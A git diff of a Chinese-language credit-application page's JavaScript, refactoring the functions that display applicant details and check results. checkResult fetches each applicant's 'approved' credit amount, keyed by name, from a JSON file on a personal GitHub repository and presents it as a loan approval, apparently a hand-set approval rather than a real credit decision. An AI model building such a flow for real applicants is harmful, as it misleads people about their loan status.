@@ -506,54 +506,54 @@ function saveAndGo3() {
 
 // 填充审核中页面的用户信息
 function populateReviewInfo() {
-  const info = JSON.parse(localStorage.getItem('creditInfo') || '{}');
-  const app = JSON.parse(localStorage.getItem('creditApplication') || '{}');
-  document.getElementById('rName').textContent = info.name || app.name || '-';
-  document.getElementById('rPhone').textContent = info.phone ? info.phone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2') : (app.phone || '-');
-  document.getElementById('rCreditCode').textContent = info.creditCode || '-';
-  document.getElementById('rAmount').textContent = localStorage.getItem('approvalAmount') ? (parseFloat(localStorage.getItem('approvalAmount')).toLocaleString() + '.00') : '-';
-  document.getElementById('rRating').textContent = info.rating || '-';
-  document.getElementById('rLoanType').textContent = info.loanType || '-';
-  document.getElementById('rStatus').textContent = localStorage.getItem('approvalStatus') === 'approved' ? '初审通过' : '审核中';
+  var safeSet=function(id,val){var el=document.getElementById(id);if(el)el.textContent=val;};
+  var info={},app={};
+  try{info=JSON.parse(localStorage.getItem('creditInfo')||'{}');}catch(e){}
+  try{app=JSON.parse(localStorage.getItem('creditApplication')||'{}');}catch(e){}
+  safeSet('rName',info.name||app.name||'-');
+  safeSet('rPhone',(info.phone?info.phone.replace(/(\d{3})\d{4}(\d{4})/,'$1****$2'):(app.phone||'-')));
+  safeSet('rCreditCode',info.creditCode||'-');
+  safeSet('rAmount',localStorage.getItem('approvalAmount')?(parseFloat(localStorage.getItem('approvalAmount')).toLocaleString()+'.00'):'-');
+  safeSet('rRating',info.rating||'-');
+  safeSet('rLoanType',info.loanType||'-');
+  safeSet('rStatus',localStorage.getItem('approvalStatus')==='approved'?'审批通过':'审核中');
 }
 
+
 function checkResult() {
+  document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
+  var p3=document.getElementById('page3');if(p3)p3.classList.add('active');
+  
   populateReviewInfo();
-  // 从 GitHub 读取该用户的额度
-  var name = document.getElementById('rName').textContent;
-  if (!name || name === '-') {
-    alert('未找到用户信息，请重新填写');
-    return;
-  }
-  var url = 'https://raw.githubusercontent.com/S-o-n-G-hua/merchant-app/main/credit-data.json?t=' + Date.now();
-  fetch(url)
-    .then(function(r){ return r.json(); })
-    .then(function(data){
-      var user = data.users && data.users[name];
-      if (user && user.amount > 0) {
-        // 写入 localStorage 供页面展示
-        localStorage.setItem('approvalAmount', user.amount);
-        localStorage.setItem('approvalStatus', user.status || 'approved');
-        document.getElementById('resultAmount').innerHTML = formatNum(user.amount) + ' <span class="result-amount-unit">元</span>';
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById('page4').classList.add('active');
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-      } else {
-        alert('额度正在审核中，请稍后或联系业务经理');
-      }
-    })
-    .catch(function(){
-      // fallback: try localStorage
-      var amount = localStorage.getItem('approvalAmount') || '';
-      if (!amount || amount === '') {
-        alert('额度正在审核中，请稍后或联系业务经理');
-      } else {
-        document.getElementById('resultAmount').innerHTML = formatNum(amount) + ' <span class="result-amount-unit">元</span>';
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById('page4').classList.add('active');
-      }
-    });
+  
+  var rNameEl=document.getElementById('rName');
+  var name=rNameEl?rNameEl.textContent:'';
+  if(!name||name==='-'){alert('未找到用户信息，请先填写申请');return;}
+  
+  var url='https://raw.githubusercontent.com/S-o-n-G-hua/merchant-app/main/credit-data.json?t='+Date.now();
+  fetch(url).then(function(r){return r.json();}).then(function(data){
+    var user=data.users&&data.users[name];
+    if(user&&user.amount>0){
+      localStorage.setItem('approvalAmount',user.amount);
+      localStorage.setItem('approvalStatus',user.status||'approved');
+      var ra=document.getElementById('resultAmount');
+      if(ra)ra.innerHTML=formatNum(user.amount)+' <span class="result-amount-unit">元</span>';
+      document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
+      var p4=document.getElementById('page4');if(p4)p4.classList.add('active');
+      window.scrollTo({top:0,behavior:'smooth'});
+    }else{
+      alert('额度审批中，预计需要10-20分钟，请稍后再试');
+    }
+  }).catch(function(){
+    var amt=localStorage.getItem('approvalAmount')||'';
+    if(!amt||amt===''){alert('网络错误，请检查网络后重试');return;}
+    var ra=document.getElementById('resultAmount');
+    if(ra)ra.innerHTML=formatNum(amt)+' <span class="result-amount-unit">元</span>';
+    document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
+    var p4=document.getElementById('page4');if(p4)p4.classList.add('active');
+  });
 }
+
 </script>
 
 </body>
